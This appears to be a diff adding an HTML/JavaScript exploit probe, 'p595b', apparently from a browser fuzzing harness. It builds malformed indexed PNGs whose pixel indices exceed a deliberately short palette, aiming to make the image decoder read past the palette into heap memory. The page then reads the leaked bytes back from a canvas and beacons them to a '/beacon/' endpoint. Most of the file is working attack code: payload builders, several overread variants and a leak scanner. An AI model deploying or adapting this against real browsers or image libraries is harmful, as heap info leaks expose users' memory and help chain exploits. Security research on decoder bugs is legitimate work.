@@ -1,0 +1,381 @@
+<!--
+  p595b: PNG palette overread — heap info leak via short PLTE + high pixel indices.
+
+  PNG color type 3 (indexed) with bit depth 8.
+  PLTE has only N entries (N*3 bytes), but pixel data uses indices > N.
+  If libpng doesn't validate palette bounds during expand_palette(),
+  palette[idx] reads past the allocation into adjacent heap data.
+
+  Each OOB pixel index gives us 3 bytes (RGB) of heap data at a known
+  offset from the palette allocation: offset = idx * 3.
+
+  Also tests: APNG frame rendering by attaching img to DOM and using
+  requestAnimationFrame for frame advancement detection.
+
+  CRASH_CLASS: MODERATE (image decode, read-only)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p595b</title>
+<style>body{margin:0;background:#111;color:#0f0;font:10px monospace}</style>
+<script>
+var LOG=[];
+function b(m){LOG.push(m);try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+
+// CRC-32
+var CRC_T=null;
+function crc32(buf){
+  if(!CRC_T){CRC_T=new Int32Array(256);for(var n=0;n<256;n++){var c=n;for(var k=0;k<8;k++)c=c&1?0xEDB88320^(c>>>1):c>>>1;CRC_T[n]=c;}}
+  var crc=-1;for(var i=0;i<buf.length;i++)crc=CRC_T[(crc^buf[i])&0xFF]^(crc>>>8);return(crc^-1)>>>0;
+}
+function chunk(type,data){
+  var len=data.length;var out=new Uint8Array(12+len);
+  out[0]=(len>>>24)&0xFF;out[1]=(len>>>16)&0xFF;out[2]=(len>>>8)&0xFF;out[3]=len&0xFF;
+  out[4]=type.charCodeAt(0);out[5]=type.charCodeAt(1);out[6]=type.charCodeAt(2);out[7]=type.charCodeAt(3);
+  out.set(data,8);
+  var ci=new Uint8Array(4+len);ci[0]=out[4];ci[1]=out[5];ci[2]=out[6];ci[3]=out[7];ci.set(data,4);
+  var c=crc32(ci);
+  out[8+len]=(c>>>24)&0xFF;out[9+len]=(c>>>16)&0xFF;out[10+len]=(c>>>8)&0xFF;out[11+len]=c&0xFF;
+  return out;
+}
+function zlibStore(data){
+  var out=[];out.push(0x78,0x01);
+  var off=0;
+  while(off<data.length){
+    var remain=data.length-off;var blen=Math.min(remain,65535);
+    var isFinal=(off+blen>=data.length)?1:0;
+    out.push(isFinal);out.push(blen&0xFF,(blen>>>8)&0xFF);
+    out.push((~blen)&0xFF,((~blen)>>>8)&0xFF);
+    for(var i=0;i<blen;i++)out.push(data[off+i]);
+    off+=blen;
+  }
+  var a=1,bb=0;
+  for(var i=0;i<data.length;i++){a=(a+data[i])%65521;bb=(bb+a)%65521;}
+  var ad=(bb<<16)|a;
+  out.push((ad>>>24)&0xFF,(ad>>>16)&0xFF,(ad>>>8)&0xFF,ad&0xFF);
+  return new Uint8Array(out);
+}
+function w32(arr,off,v){arr[off]=(v>>>24)&0xFF;arr[off+1]=(v>>>16)&0xFF;arr[off+2]=(v>>>8)&0xFF;arr[off+3]=v&0xFF;}
+function w16(arr,off,v){arr[off]=(v>>>8)&0xFF;arr[off+1]=v&0xFF;}
+var SIG=new Uint8Array([137,80,78,71,13,10,26,10]);
+function mkIHDR(w,h,depth,ctype){
+  var d=new Uint8Array(13);w32(d,0,w);w32(d,4,h);d[8]=depth;d[9]=ctype;d[10]=0;d[11]=0;d[12]=0;
+  return chunk('IHDR',d);
+}
+function mkIEND(){return chunk('IEND',new Uint8Array(0));}
+function cat(){
+  var total=0;for(var i=0;i<arguments.length;i++)total+=arguments[i].length;
+  var out=new Uint8Array(total);var off=0;
+  for(var i=0;i<arguments.length;i++){out.set(arguments[i],off);off+=arguments[i].length;}
+  return out;
+}
+
+// Make PLTE chunk: entries is array of [R,G,B]
+function mkPLTE(entries){
+  var d=new Uint8Array(entries.length*3);
+  for(var i=0;i<entries.length;i++){d[i*3]=entries[i][0];d[i*3+1]=entries[i][1];d[i*3+2]=entries[i][2];}
+  return chunk('PLTE',d);
+}
+
+// Make tRNS for palette: array of alpha values
+function mkTRNS(alphas){return chunk('tRNS',new Uint8Array(alphas));}
+
+// Make IDAT for indexed image (filter=0, 1 byte per pixel)
+function mkIDATIndexed(w,h,indices){
+  var rowLen=1+w;
+  var raw=new Uint8Array(rowLen*h);
+  for(var y=0;y<h;y++){
+    raw[y*rowLen]=0; // filter=None
+    for(var x=0;x<w;x++){
+      raw[y*rowLen+1+x]=indices[y*w+x];
+    }
+  }
+  return chunk('IDAT',zlibStore(raw));
+}
+
+function loadAndScan(name, pngBytes, w, h, cb){
+  var blob=new Blob([pngBytes],{type:'image/png'});
+  var url=URL.createObjectURL(blob);
+  var img=new Image();
+  img.onload=function(){
+    b(name+':LOADED,'+img.width+'x'+img.height);
+    var cv=document.createElement('canvas');cv.width=w;cv.height=h;
+    var ctx=cv.getContext('2d');
+    ctx.drawImage(img,0,0);
+    var id=ctx.getImageData(0,0,w,h);
+    scanPixels(name,id.data,w,h);
+    URL.revokeObjectURL(url);
+    cb();
+  };
+  img.onerror=function(){
+    b(name+':ERR');
+    URL.revokeObjectURL(url);
+    cb();
+  };
+  img.src=url;
+}
+
+function scanPixels(tag,data,w,h){
+  var nz=0, nzAlpha=0, unexpected=0;
+  var interesting=[];
+  var totalPx=w*h;
+  // Track unique RGBA values
+  var seen={};
+  var uniqueCount=0;
+
+  for(var i=0;i<data.length;i+=4){
+    var r=data[i],g=data[i+1],bb=data[i+2],a=data[i+3];
+    if(r||g||bb||a)nz++;
+    if(a!==0&&a!==255)nzAlpha++;
+
+    var key=r+'.'+g+'.'+bb+'.'+a;
+    if(!seen[key]){seen[key]=1;uniqueCount++;
+      // Report first 40 unique colors
+      if(uniqueCount<=40){
+        interesting.push((i/4)+'='+key);
+      }
+    }
+  }
+
+  b(tag+':NZ='+nz+'/'+totalPx+',NZA='+nzAlpha+',UNIQUE='+uniqueCount);
+  // Send unique pixels in batches
+  for(var j=0;j<interesting.length;j+=4){
+    b(tag+':U='+interesting.slice(j,j+4).join('|'));
+  }
+}
+
+function main(){
+b('G');
+
+var W=32, H=32;
+
+// ============================================================
+// P1: Control — valid indexed PNG with 4 palette entries, indices 0-3
+// Should show 4 distinct colors
+// ============================================================
+var palette4=[[255,0,0],[0,255,0],[0,0,255],[255,255,0]];
+var idxCtrl=new Uint8Array(W*H);
+for(var i=0;i<W*H;i++)idxCtrl[i]=i%4;
+
+var p1=cat(SIG,
+  mkIHDR(W,H,8,3),
+  mkPLTE(palette4),
+  mkTRNS([255,255,255,255]),
+  mkIDATIndexed(W,H,idxCtrl),
+  mkIEND()
+);
+b('P1:size='+p1.length);
+
+// ============================================================
+// P2: Overread — 4 palette entries but indices 128-255
+// If libpng doesn't validate, reads heap at offset 128*3=384 to 255*3=765
+// past the 12-byte PLTE allocation
+// ============================================================
+var idxOOB=new Uint8Array(W*H);
+for(var i=0;i<W*H;i++)idxOOB[i]=128+(i%128); // indices 128-255
+
+var p2=cat(SIG,
+  mkIHDR(W,H,8,3),
+  mkPLTE(palette4),
+  mkTRNS([255,255,255,255]),
+  mkIDATIndexed(W,H,idxOOB),
+  mkIEND()
+);
+b('P2:size='+p2.length);
+
+// ============================================================
+// P3: Overread with 1 palette entry — maximizes OOB range
+// palette = 3 bytes, index 255 reads at offset 255*3=765
+// ============================================================
+var palette1=[[0,0,0]];
+var idxMax=new Uint8Array(W*H);
+for(var i=0;i<W*H;i++)idxMax[i]=255; // all at max index
+
+var p3=cat(SIG,
+  mkIHDR(W,H,8,3),
+  mkPLTE(palette1),
+  mkTRNS([255]),
+  mkIDATIndexed(W,H,idxMax),
+  mkIEND()
+);
+b('P3:size='+p3.length);
+
+// ============================================================
+// P4: Overread gradient — indices 0 through 255, 2 palette entries
+// Shows a "spectrum" of heap data if it works
+// ============================================================
+var palette2=[[255,255,255],[0,0,0]];
+var idxGrad=new Uint8Array(W*H);
+for(var i=0;i<W*H;i++)idxGrad[i]=i%256;
+
+var p4=cat(SIG,
+  mkIHDR(W,H,8,3),
+  mkPLTE(palette2),
+  mkTRNS([255,255]),
+  mkIDATIndexed(W,H,idxGrad),
+  mkIEND()
+);
+b('P4:size='+p4.length);
+
+// ============================================================
+// P5: Large image, 1 palette entry, ALL pixels index 200
+// 128x128 = 16384 pixels, each reading 3 bytes at offset 200*3=600
+// Repeated reads at the same offset detect consistency
+// ============================================================
+var LW=128,LH=128;
+var idxLarge=new Uint8Array(LW*LH);
+for(var i=0;i<LW*LH;i++)idxLarge[i]=200;
+
+var p5=cat(SIG,
+  mkIHDR(LW,LH,8,3),
+  mkPLTE(palette1),
+  mkTRNS([255]),
+  mkIDATIndexed(LW,LH,idxLarge),
+  mkIEND()
+);
+b('P5:size='+p5.length);
+
+// ============================================================
+// P6: No tRNS — PLTE only, 4 entries, indices way OOB
+// tRNS absence might change decode path
+// ============================================================
+var p6=cat(SIG,
+  mkIHDR(W,H,8,3),
+  mkPLTE(palette4),
+  // NO tRNS
+  mkIDATIndexed(W,H,idxOOB),
+  mkIEND()
+);
+b('P6:size='+p6.length);
+
+// ============================================================
+// P7: Bit depth 4 with 2 palette entries — indices 0-15
+// 4-bit: valid range 0-15, but only 2 in PLTE
+// index 15 reads at 15*3=45, 37 bytes past 6-byte PLTE
+// ============================================================
+// For bit depth 4, each byte encodes 2 pixels (high nibble, low nibble)
+var palette2b=[[255,0,0],[0,0,255]];
+var rowLen4=1+Math.ceil(W/2); // filter byte + packed pixels
+var raw4=new Uint8Array(rowLen4*H);
+for(var y=0;y<H;y++){
+  raw4[y*rowLen4]=0; // filter=None
+  for(var x=0;x<W;x+=2){
+    var hi=((y*W+x)%16); // indices 0-15
+    var lo=((y*W+x+1)%16);
+    raw4[y*rowLen4+1+x/2]=(hi<<4)|lo;
+  }
+}
+var p7=cat(SIG,
+  mkIHDR(W,H,4,3),
+  mkPLTE(palette2b),
+  mkTRNS([255,255]),
+  chunk('IDAT',zlibStore(raw4)),
+  mkIEND()
+);
+b('P7:size='+p7.length);
+
+// ============================================================
+// P8: APNG with img in DOM + long delay
+// Attach img to body, wait 2s, then capture
+// Tests if APNG advances when img is visible
+// ============================================================
+var acTL=new Uint8Array(8);w32(acTL,0,2);w32(acTL,4,0);
+var fcTL0=new Uint8Array(26);w32(fcTL0,0,0);w32(fcTL0,4,W);w32(fcTL0,8,H);
+w16(fcTL0,20,100);w16(fcTL0,22,1000); // 100ms
+// Row data for RGBA APNG
+function mkRowsRGBA(w,h,fill){
+  var rl=1+w*4;var raw=new Uint8Array(rl*h);
+  for(var y=0;y<h;y++){raw[y*rl]=0;
+    if(fill)for(var x=0;x<w;x++){var o=y*rl+1+x*4;raw[o]=fill[0];raw[o+1]=fill[1];raw[o+2]=fill[2];raw[o+3]=fill[3];}}
+  return raw;
+}
+var fcTL1=new Uint8Array(26);w32(fcTL1,0,1);w32(fcTL1,4,W);w32(fcTL1,8,H);
+w16(fcTL1,20,100);w16(fcTL1,22,1000);
+var zF1=zlibStore(mkRowsRGBA(W,H,[0,0,255,255]));
+var fdatData=new Uint8Array(4+zF1.length);w32(fdatData,0,2);fdatData.set(zF1,4);
+
+var p8=cat(SIG,
+  mkIHDR(W,H,8,6),
+  chunk('acTL',acTL),
+  chunk('fcTL',fcTL0),
+  chunk('IDAT',zlibStore(mkRowsRGBA(W,H,[255,0,0,255]))),
+  chunk('fcTL',fcTL1),
+  chunk('fdAT',fdatData),
+  mkIEND()
+);
+b('P8:size='+p8.length);
+
+// ============================================================
+// Run tests
+// ============================================================
+var tests=[
+  ['P1',p1,W,H],
+  ['P2',p2,W,H],
+  ['P3',p3,W,H],
+  ['P4',p4,W,H],
+  ['P5',p5,LW,LH],
+  ['P6',p6,W,H],
+  ['P7',p7,W,H],
+];
+
+var ti=0;
+function runNext(){
+  if(ti>=tests.length){
+    // Run P8 (APNG in DOM) last
+    runAPNGDom();
+    return;
+  }
+  var t=tests[ti++];
+  loadAndScan(t[0],t[1],t[2],t[3],runNext);
+}
+
+function runAPNGDom(){
+  var blob=new Blob([p8],{type:'image/png'});
+  var url=URL.createObjectURL(blob);
+  var img=new Image();
+  img.style.position='absolute';img.style.left='-9999px';
+
+  img.onload=function(){
+    b('P8:LOADED,'+img.width+'x'+img.height);
+    document.body.appendChild(img);
+
+    // Capture frame 0 immediately
+    var cv=document.createElement('canvas');cv.width=W;cv.height=H;
+    var ctx=cv.getContext('2d');
+    ctx.drawImage(img,0,0);
+    var id0=ctx.getImageData(0,0,W,H);
+    scanPixels('P8-F0',id0.data,W,H);
+
+    // Wait 500ms for animation
+    setTimeout(function(){
+      ctx.clearRect(0,0,W,H);
+      ctx.drawImage(img,0,0);
+      var id1=ctx.getImageData(0,0,W,H);
+      scanPixels('P8-500ms',id1.data,W,H);
+
+      // Wait another 1500ms
+      setTimeout(function(){
+        ctx.clearRect(0,0,W,H);
+        ctx.drawImage(img,0,0);
+        var id2=ctx.getImageData(0,0,W,H);
+        scanPixels('P8-2000ms',id2.data,W,H);
+
+        document.body.removeChild(img);
+        URL.revokeObjectURL(url);
+        b('ALL-DONE');
+        b('ALIVE');
+      },1500);
+    },500);
+  };
+  img.onerror=function(){
+    b('P8:ERR');
+    URL.revokeObjectURL(url);
+    b('ALL-DONE');b('ALIVE');
+  };
+  img.src=url;
+}
+
+runNext();
+}
+
+setTimeout(main,50);
+setTimeout(function(){b('ALIVE-FALLBACK');},30000);
+</script></head><body></body></html>
